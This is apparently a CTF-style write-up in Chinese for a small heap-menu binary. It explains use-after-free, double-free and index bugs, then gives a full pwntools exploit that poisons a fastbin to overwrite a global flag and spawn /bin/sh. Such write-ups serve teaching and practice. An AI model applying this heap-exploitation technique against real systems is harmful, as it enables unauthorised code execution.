## 漏洞成因
程序存在多个内存破坏漏洞，主要源于堆管理中的安全检查缺失：

### 关键结构体与全局变量
- **全局数组`buf`**：位于`0x6020c0`，类型为`void*[4]`，存储分配的内存块指针（指向用户数据区，即chunk + 0x10）。
- **控制变量`qword_602090`**：位于`0x602090`，类型为`unsigned __int64`，值为0时触发`system("/bin/sh")`。
- **计数器`dword_6020BC`**：位于`0x6020BC`，类型为`int`，记录当前分配的内存块数量。

### 漏洞分析
1. **Use-After-Free (UAF) 漏洞**：
   - 位置：释放函数（`sub_4009D7`）和写入函数（`sub_400A4D`）。
   - 成因：释放内存后，`buf`数组中的指针未被置为`NULL`，允许通过索引向已释放内存写入数据（如`edit(0, ...)`操作已释放chunk）。
   - 影响：攻击者可操纵fastbin链表，实现任意地址分配。

2. **双重释放 (Double-Free) 漏洞**：
   - 位置：释放函数（`sub_4009D7`）。
   - 成因：释放时未检查指针是否已释放，用户可多次释放同一索引。
   - 影响：可能破坏堆管理器元数据，但本exp未直接利用此漏洞。

3. **索引越界漏洞**：
   - 位置：释放和写入函数中索引处理部分（使用`atoi`未验证范围）。
   - 成因：用户输入索引未限制在0-3范围内，可能导致越界访问`buf`数组。
   - 影响：本exp未利用，但潜在风险高。

**根本原因**：程序缺乏释放后指针清零和索引边界检查，结合fastbin机制，使UAF成为利用关键。

## 漏洞利用过程
利用过程通过UAF修改fastbin fd指针，实现任意地址分配，覆盖关键变量`qword_602090`。以下是基于调试记录的内存变化总结（以表格形式描述）：

| 步骤 | 操作 | 关键内存变化 | 目的 |
|------|------|--------------|------|
| **Step 1** | `add(0x40); add(0x20); delete(0)` | - `buf[0]`指向已释放chunk（0x2ae72010）<br>- Fastbin: 0x2ae72000 → 0x0<br>- `qword_602090` = 1 | 创建UAF条件：chunk 0被释放但指针保留 |
| **Step 2** | `edit(0, p64(0x602080))` | - `buf[0]`的fd指针被修改为0x602080<br>- Fastbin: 0x2ae72000 → 0x602080 → 0x1<br>- `dword_6020BC`部分污染 | 利用UAF操纵fastbin链表，指向目标地址 |
| **Step 3** | `add(0x40); add(0x40)` | - `buf[2]`分配原始chunk（0x2ae72010）<br>- `buf[3]`在0x602080分配，指向0x602090<br>- Fastbin: 剩余chunk 0x1 | 通过fastbin攻击在目标地址分配内存，控制`qword_602090` |
| **Step 4** | `edit(3, p64(0))` | - `qword_602090`从1覆盖为0<br>- 其他内存状态稳定 | 覆盖关键变量，满足shell触发条件 |
| **Step 5** | `backdoor()` | - 调用`system("/bin/sh")`<br>- 进程切换到shell | 触发shell，获得权限 |
| **Step 6** | `p.interactive()` | - 进入交互式shell会话 | 维持shell控制 |

### 内存布局演变
- **初始状态**：堆chunk正常分配，`qword_602090 = 1`。
- **利用后状态**：fastbin被污染，`buf[3]`指向`qword_602090`，其值被覆盖为0。
- **关键地址**：
  - `0x602080`：目标分配地址，chunk头设置为0x50大小。
  - `0x602090`：关键变量地址，最终值0。

## Exploit
以下是完整的漏洞利用脚本（exp），在关键位置添加注释说明：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample14')
elf = ELF('./data/sample14')
libc = elf.libc

# 定义辅助函数封装菜单操作
def add(size):
    p.recvuntil(b'choice>\n')
    p.sendline(b'1')
    p.recvuntil(b'size>\n')
    p.sendline(str(size))

def delete(index):
    p.recvuntil(b'choice>\n')
    p.sendline(b'2')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil(b'choice>\n')
    p.sendline(b'3')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))
    p.send(content)  # 写入8字节数据

def backdoor():
    p.recvuntil(b'choice>\n')
    p.sendline(b'4')

# 漏洞利用步骤
# Step 1: 创建UAF条件 - 分配两个chunk后释放索引0
add(0x40)  # 分配chunk 0，大小0x40（实际chunk大小0x51）
add(0x20)  # 分配chunk 1，大小0x20（实际chunk大小0x31）
delete(0)  # 释放chunk 0，但buf[0]指针未清零，形成UAF

# Step 2: 利用UAF修改fastbin fd指针 - 向已释放的chunk 0写入目标地址
edit(0, p64(0x602080))  # 将chunk 0的fd指针覆盖为0x602080（目标地址附近）

# Step 3: 通过fastbin攻击实现任意地址分配
add(0x40)  # 第一次分配：从fastbin取出原始chunk（buf[2]指向同一内存）
add(0x40)  # 第二次分配：从修改后的fastbin在0x602080分配，buf[3]指向0x602090

# Step 4: 覆盖关键变量 - 通过buf[3]直接修改qword_602090为0
edit(3, p64(0))  # 写入8字节0，覆盖qword_602090

# Step 5: 触发shell - 调用backdoor函数
backdoor()  # 此时qword_602090=0，执行system("/bin/sh")

# Step 6: 进入交互模式
p.interactive()  # 维持shell会话，供用户操作
```

### 注释说明
- **目标地址选择**：`0x602080`位于全局变量区，通过分配chunk覆盖`qword_602090`（偏移+0x10）。
- **大小选择**：分配大小0x40对应fastbin大小0x50，确保攻击兼容性。
- **利用逻辑**：通过UAF—fastbin攻击—任意地址分配—关键变量覆盖的链式利用，最终触发shell。

此exp在提供的调试环境中验证成功，可稳定获得shell权限。建议在实际环境中测试时调整地址偏移（如ASLR开启需泄漏基址）。
